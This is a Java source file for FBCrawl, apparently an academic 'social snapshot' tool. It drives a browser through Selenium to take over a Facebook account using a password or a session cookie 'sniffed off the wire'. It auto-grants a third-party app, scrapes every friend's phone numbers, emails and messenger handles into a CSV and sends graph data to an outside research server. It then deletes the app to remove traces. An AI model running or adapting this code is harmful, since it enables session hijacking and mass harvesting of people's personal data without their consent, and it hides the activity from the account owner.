/*  Copyright 2010-2011 SBA Research gGmbH

     This file is part of FBCrawl.

    FBCrawl is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    FBCrawl is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with FBCrawl.  If not, see <http://www.gnu.org/licenses/>.*/

package org.sbaresearch.fbcrawl;

import com.thoughtworks.selenium.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.List;

import javax.management.timer.*;
import java.io.*;


/**
 * A Facebook crawler class, utilising Selenium. The basic procedure it uses is
 * as follows: 1. Log into Facebook, either by using login credentials (mail and
 * password) or a cookie you sniffed off the ether. 2. Open a window with our
 * Graph Crawler, grant permissions automatically, wait a few seconds, then
 * switch back from that window 3. Open the friends list 4. Iterate through all
 * friends, open their "info" page and print all fields there that contain an
 * '@' character to stdout 5. Remove our Graph app from the list of installed
 * applications.
 * 
 * You need to start a Selenium server on the default port before launching this
 * application.
 * 
 * @author mleithner@sba-research.org
 * 
 */
public class FBCrawl {
	/**
	 * Indicates whether we're coming from a login page or just jumped right
	 * into the session with a session cookie.
	 */
	static boolean fromLogin = false;
	
	/*
	 * The application id for log-out ccs,div
	 */
	// XXX: You will want to replace this. If you are not sure where to find the
	// appropriate value, simply grant your app access to your account, then
	// examine the corresponding link to remove your app from the Facebook
	// "Applications" settings.
	final static String appid = "1723SOMETHING";
	
	// The browser string used for the Selenium server.
	// XXX: You MIGHT want to change this, e.g. for newer versions of Firefox.
	// For further help, see the Selenium-RC docs.
	// Note that at the time of writing (May 2011), Selenium doesn't play
	// very nice with FF4.
	final static String browserString = "*firefox3";

	// The path to your FB application, i.e. where you installed FBCrawl to.
	// XXX: You definitely do want to change this. Unless you feel like pushing 
	// your data over to us...in which case you give SBA Research consent to use it for
	// anonymised research purposes.
	final static String graphHost = "http://puffy.nysos.net/socialsnapshot/php/";

	/*
	 * Timeout for application removal
	 */
	static Date appExeTimeout;
	//Time in minutes
	//static Integer apptimeout = 30;
	//No timeout for now
	static Integer apptimeout = 0;
	
	/**
	 * A number of cookie names that should be set in order to be able to access Facebook via Header Injection.
	 */
	static ArrayList<String> cookieNames = new ArrayList<String>();
	static {
		FBCrawl.cookieNames.add("locale");
		FBCrawl.cookieNames.add("datr");
		FBCrawl.cookieNames.add("lu");
		FBCrawl.cookieNames.add("sct");
		FBCrawl.cookieNames.add("x-referer");
		FBCrawl.cookieNames.add("lsd");
		FBCrawl.cookieNames.add("c_user");
		FBCrawl.cookieNames.add("cur_max_lag");
		FBCrawl.cookieNames.add("sid");
		FBCrawl.cookieNames.add("xs");
		FBCrawl.cookieNames.add("e");
		FBCrawl.cookieNames.add("presence");
	};

	/**
	 * Displays the given error message and terminates the program. Ugly hack.
	 * 
	 * @param msg
	 *            Error message
	 */
	public static void fail(String msg) {
		System.err.println(msg);
		System.exit(-1);
	}

	/**
	 * Main method; please see the class description for a rough overview of
	 * what it does, and the inline documentation for details.
	 * 
	 * @param args
	 *            Either a cookie (you will need to include the HTTPOnly
	 *            cookies, too; document.cookie will NOT do it) or two
	 *            parameters, the first being the mail address, the second
	 *            should be the password.
	 */
	public static void main(String[] args) {

		String mail, password, cookie;
		ArrayList<String> friendUrls = null;
		mail = password = cookie = null;

		/**
		 * Handling command line parameters. If we get two of them, assume we're
		 * doing password authentication (args[0] should be the mail address,
		 * args[1] the password). Otherwise, if there are command line
		 * parameters, we're using the first one as a cookie. If there are no
		 * command line parameters, hard-coded login credentials might be used.
		 * They might not be available in your build (for obvious security
		 * reasons).
		 */
		if (args.length == 2) {
			System.out.println("DEBUG: Using password auth.");
			mail = args[0];
			password = args[1];
			/*System.out.println("DEBUG: User credentials: " + mail + "/"
					+ password);*/
		} else if (args.length > 0) {
			System.out.println("DEBUG: Using cookie auth.");
			StringBuilder cookieBuilder = new StringBuilder(args[0]);
			for(int i=1; i<args.length; i++)
			{
				cookieBuilder.append(args[i]);
			}
			cookie = cookieBuilder.toString();
			System.out.println("DEBUG: Cookie: " + cookie);
//			System.out
//					.println("WARNING: Due to a bug in the Selenium RC server, this cookie will be stored until you shut the server down. PLEASE TAKE NOTICE. Password auth will not work anymore in this Selenium RC instance.");
		} else {
			System.out.println("__________FBCrawl__________\n" +
					"Usage:\n" +
					"java -jar fbcrawl.jar <cookie>\n" +
					"java -jar fbcrawl.jar <mail> <password>\n" +
					"\n\nFBCrawl logs into a Facebook account (or simply uses a cookie you sniffed off the wire), grabs all mail adresses of this account's friends and crawls data using the Graph API.\n" +
					"Please note that you'll have to start a Selenium server before using this tool.\n" +
					"You can start a Selenium server by using java -jar selenium-server.jar.");
			System.exit(0);
		}

		// Connect to the selenium server and tell it what browser we want to
		// use and with what base URL
		Selenium selenium = new DefaultSelenium("localhost", 4444, FBCrawl.browserString,
				"http://facebook.com");
		// Start the browser
		selenium.start("captureNetworkTraffic=true");
		
		Date currenttime = new Date();
	    System.out.println("Start Time: " + currenttime.toString() + "\n");
	       
		// Open Facebook and wait until the page has loaded; also, enable
		// network traffic capturing (Selenium is slightly buggy and might only
		// allow us to actually inject cookies with those settings).
		selenium.open("http://facebook.com/");
		System.out.println(selenium.captureNetworkTraffic("plain"));
//		selenium.waitForPageToLoad("10000");
		
		// Set the cookie, if given.
		if (null != cookie) {
//			selenium.addCustomRequestHeader("Cookie", cookie);
			for(String singleCookie : cookie.split(";"))
			{
				String name, value;
				int equalsIndex = singleCookie.indexOf('=');
				name = singleCookie.substring(0, equalsIndex).trim();
				value = singleCookie.substring(equalsIndex + 1).trim();
				System.out.println("Checking cookie " + name);
				if(FBCrawl.cookieNames.contains(name))
				{
					selenium.addSetCookie(name, value +  "; path=/; domain=.facebook.com");
					System.out.println("Set cookie " + name);
				}
			}
		}
		selenium.open("http://facebook.com/?ref=home");
		System.out.println("First instance loaded, should now have cookies.");
		// Reloading the front page - the first load was used to inject cookies
		selenium.open("http://facebook.com/?ref=logo");

		// Are we doing password auth? If so, call our function.
		if (mail != null && password != null)
			FBCrawl.login(selenium, mail, password);

		// For test purposes, simply grab the user's account name
		// String accname = selenium.getText("id=navAccountName");

		// Did we just use cookie auth? If so, we need to get rid of that
		// annoying popup that tells us to login, even though we are.
		if (!FBCrawl.fromLogin) {
			if (!FBCrawl.waitForElement(selenium,
					"xpath=//input[@type='button' and @name='cancel']", 10)) {
				System.err
						.println("Can't find the popup window cancel button...");
			}
			else
				selenium.click("xpath=//input[@type='button' and @name='cancel']");
		}

		// Long timeout in case our Graph server is laggy.
		selenium.setTimeout("60000");

		// Open our Graph Crawler in a popup window called fbc. We can then let
		// it process in parallel to the rest we're doing with Selenium.
		String nonce = "snapshot" + new Date().getTime();
		selenium.openWindow(FBCrawl.graphHost + "/?sendid=" + nonce, "fbc");

		// Wait for the popup to load, then select it
		selenium.waitForPopUp("fbc", "60000");
		selenium.selectWindow("fbc");

		// Let's click on the "Connect to FB" link.
		selenium.click("id=connectlink");
		try {
			// Waiting for the next page to load. This could either be the
			// "Grant Permissions" prompt, or - if we're already authorised - it
			// will fail because the Graph Crawler will take for too long to
			// load.
			selenium.waitForPageToLoad("60000");

			// If we reach this point, we're obviously on the Facebook prompt
			// site. Let's wait for the "Grant" button to appear.
			if (FBCrawl.waitForElement(selenium, "name=grant_clicked", 15)) {
				// Click on the "Grant" button, then wait for the page to load.
				selenium.click("name=grant_clicked");
				selenium.waitForPageToLoad("60000");
			}
			else
				System.out
				.println("Seems that the application was already added. Oh joy! ;)");
			
			//Calculate application execution timeout
			appExeTimeout = new Date(new Date().getTime() + apptimeout * Timer.ONE_MINUTE);

			// Let Selenium crawl through the links to friend profiles our Graph API just produced
			friendUrls = FBCrawl.fetchFriendUrls(selenium, "friend");
			
			// Begin the Graph crawl
			selenium.click("class=continue");
			
			// Switch to the root window, our work here is done.
			selenium.selectWindow(null);
		} catch (Exception e1) {

			System.out.println("Exception: " + e1.getMessage()
					+ ". Not like we care. Continuing.");
			selenium.selectWindow(null);
		}
		
		// If we managed to fetch links to friend profiles
		if(null != friendUrls)

			try{

			   if ((new File("results")).mkdir()) {
				      System.out.println("Directory for results created.");
			   }    
				
				// Create file for logs
				FileWriter fstream = new FileWriter("results/" + nonce + ".csv");
				BufferedWriter logfile = new BufferedWriter(fstream);

				//Iterate over them
				for(String link : friendUrls)
				{
					//Add the "v=info" suffix to the link; we want to view the friend's info page, not his/her wall
					String userid = link.split("=")[1];
					System.out.print(userid + ",");
					if (link.contains("?"))
						link += "&v=info";
					else
						link += "?v=info";

					// Open the friend's info page
					selenium.open(link);

					// Wait until the data is actually there.
					if (!FBCrawl.waitForElement(selenium,
							"xpath=//td[@class='data']", 5)) {
						System.err
						.println("Can't find data fields, maybe this is a page instead of a user. Not to worry, we'll just continue.");
					}

					
					// Username from page title
					String name = selenium.getTitle();
					
					String emails = "";
					String instant = "";
					String mailimgurls = "";
					String phones = "";
					//String result = "";
					//List of Instant Names from FB
					List<String> instantNames = Arrays.asList("AIM","Google Talk","Windows Live Messenger","Skype","Yahoo! Messenger","Gadu-Gadu","ICQ","Yahoo Japan","QQ","NateOn","Twitter","Hyves","Orkut","Cyworld","mixi","QIP","Rediff Bol","Vkontakte");
					
					if (selenium.isElementPresent("xpath=//div[@id='pagelet_contact']//tbody")) {
						Number numberOfSections = selenium.getXpathCount("//div[@id='pagelet_contact']//tbody");
						String value = "";
						//System.out.print("\n" + numberOfSections.toString() + " Sections found" + "\n");
						
						//Loop through every section
						for (Integer sec=1; sec <= numberOfSections.intValue(); sec++){
							Number entries = selenium.getXpathCount("//div[@id='pagelet_contact']//tbody[" + sec + "]//li");						
							//Loop through every element in section
							for (Integer pos=1; pos <= entries.intValue(); pos++){
								
							value = selenium.getText("xpath=//div[@id='pagelet_contact']//tbody[" + sec + "]//li[" + pos + "]");
							//System.out.println("Value " + sec.toString() + "." + pos.toString() + ": '" + value + "'");
							
							try{							
							if (value.startsWith("+", 0)){
								//System.out.print("Phone found: " + value + "\n");
								phones+=(value+",");
							}
							else if (value.contains("(")){
								String protocol = value.substring(value.indexOf('(') + 1,value.lastIndexOf(')'));
								if (instantNames.contains(protocol)){
								//System.out.print("Instant found: " + value + "\n");}
									instant+=(value+",");
							}}
							else if(value.contains("@")){
								//System.out.print("Email found: " + value + "\n");
								emails+=(value+",");
							}
							else if(selenium.isElementPresent("xpath=//div[@id='pagelet_contact']//tbody[" + sec + "]//li[" + pos + "]/img")){
								
								value = selenium.getAttribute("xpath=//div[@id='pagelet_contact']//tbody[" + sec + "]//li[" + pos + "]/img/@src");
								//System.out.print("Email Image URL found: " + value + "\n");
								value = "http://www.facebook.com" + value.replace("8.7", "35");
								mailimgurls+=(value+",");
							}
							}
							catch (Exception e){//Catch exception if any
								System.err.println("Error.  Could not parse: " + sec.toString() + "." + pos.toString() + " SectionNR: " + numberOfSections.toString());
							}	
							}
						}
						
						logfile.write(userid + ";" + name + ";" + phones + ";" + instant + ";" + emails + ";" + mailimgurls + "\n");
						logfile.flush();
					}
				}
				//Close the output stream
				logfile.close();
				
			}
		catch (Exception e){//Catch exception if any
			System.err.println("Error: " + e.getMessage());
		}	
		currenttime = new Date();
		System.out.println("\nEnd Time: " + currenttime.toString());
		System.out.println("\nYou can find the contact-details in results/" + nonce + ".csv");
		System.out.println("You can receive the downloaded graph data at " + FBCrawl.graphHost + "/compress.php?id=" + nonce);
		System.out.println("Attention: Data from FB application may be still fetching data!");
		//Idle until application timeout has been reached
		
		while(new Date().getTime() < appExeTimeout.getTime()){
		Calendar calendar = GregorianCalendar.getInstance();
		calendar.setTime(new Date (appExeTimeout.getTime() - new Date().getTime()));
		Integer minutesleft = calendar.get(Calendar.MINUTE);
		//System.out.println(minutesleft.toString() + " minutes left.");
		try {
			//Sleep for one minute
			Thread.currentThread().sleep(60000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		if (minutesleft%10 == 0){
			System.out.println(minutesleft.toString() + " minutes left until finished.");
		}
		
		}
		
		// Now let's try to remove all traces of our activity. Okay, at least the app from the user's profile.
		selenium.open("https://www.facebook.com/settings/?tab=applications&app_id=" + appid + "#application-li-" + appid);
		selenium.waitForPageToLoad("60000");
		
		// Wait for 10 seconds, see if we can find the "delete" link
		if (FBCrawl
				.waitForElement(
						selenium,
						"class=fbSettingsExpandedDelete",
						10)) {

			// If we can, click it and wait for the removal confirmation box
			selenium
			.click("class=fbSettingsExpandedDelete");

			if (!FBCrawl.waitForElement(selenium, "name=remove", 15)) {
				System.err
				.println("Seems like the box to remove our app isn't opening...");
			}
			else
				// Click the removal confirmation box
				selenium.click("name=remove");
		} else
			System.out
			.println("Couldn't find our app and remove it, sorry. Logging out.");
		
		System.out.println("Finished social snapshot, exiting now.");
		
		// Log out and stop
		selenium.open("https://register.facebook.com/logout.php");
		selenium.close();
		selenium.stop();
	}

	/**
	 * Waits for an element to appear in the DOM for 30 seconds.
	 * 
	 * @param selenium
	 *            A Selenium instance to use for polling.
	 * @param selector
	 *            A Selenium selector to poll for.
	 * @return true if the element appeared; false if it didn't exist after the
	 *         timeout or an exception occurred.
	 */
	@SuppressWarnings("unused")
	private static boolean waitForElement(Selenium selenium, String selector) {
		return FBCrawl.waitForElement(selenium, selector, 30);
	}

	/**
	 * Waits for an element to appear in the DOM for a specified number of
	 * seconds.
	 * 
	 * @param selenium
	 *            A Selenium instance to use for polling.
	 * @param selector
	 *            A Selenium selector to poll for.
	 * @param seconds
	 *            The number of seconds to wait for the element to become
	 *            present.
	 * @return true if the element appeared; false if it didn't exist after the
	 *         timeout or an exception occurred.
	 */
	private static boolean waitForElement(Selenium selenium, String selector,
			int seconds) {
		for (int second = 0;; second++) {
			if (second >= seconds)
				return false;
			try {
				if (selenium.isElementPresent(selector))
					return true;
			} catch (Exception e) {
				System.err.println("Error while polling for element: "
						+ e.getMessage());
				return false;
			}
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
				return false;
			}
		}
	}

	/**
	 * Handles the login procedure of Facebook. This is mostly separated from
	 * the main() method for better readability. <b>WARNING</b> For some reason,
	 * Selenium does not play well with long passwords, especially passwords
	 * that contain non-alphanumeric characters.c
	 * 
	 * @param selenium
	 *            A Selenium instance to operate on.
	 * @param mail
	 *            The mail address used to log in.
	 * @param password
	 *            The user's password.
	 */
	private static void login(Selenium selenium, String mail, String password) {
		String mailPart, tld;

		/*
		 * Separate the TLD from the rest of the mail address. For reasons
		 * explained below.
		 */
		mailPart = mail.substring(0, mail.lastIndexOf('.') + 1);
		tld = mail.substring(mail.lastIndexOf('.'));
		/*
		 * Type the right value into the email field. Why not use typeKeys for
		 * the whole thing? Well, because it's buggy and doesn't add some of the
		 * characters, for some weird reason.
		 */
		selenium.controlKeyUp();
		selenium.type("id=email", mailPart);
		selenium.controlKeyUp();
		selenium.typeKeys("id=email", tld);

		/*
		 * FB replaces the input field pass_placeholder with pass (where
		 * pass_placeholder is a text input that displays "Password" and pass is
		 * a password input). So let's give it the hint.
		 */
		if (selenium.isElementPresent("id=pass_placeholder"))
			selenium.click("id=pass_placeholder");
		selenium.focus("id=pass");

		/* Type the password */
		selenium.controlKeyUp();
		selenium.typeKeys("id=pass", password);

		/* Press the submit button and wait until the new page has loaded */
		selenium.click("xpath=//label[@class='uiButton uiButtonConfirm']/input");
		selenium.waitForPageToLoad("60000");
		FBCrawl.fromLogin = true;
	}
	
	private static ArrayList<String> fetchFriendUrls(Selenium selenium, String classname)
	{
		ArrayList<String> urls = new ArrayList<String>();
		for(int i=1; selenium.isElementPresent("//a[@class=\"" + classname + "\"][" + i + "]"); i++)
		{
			urls.add(selenium.getAttribute("//a[@class=\"" + classname + "\"][" + i + "]@href"));
		}
		return urls;
	}

}
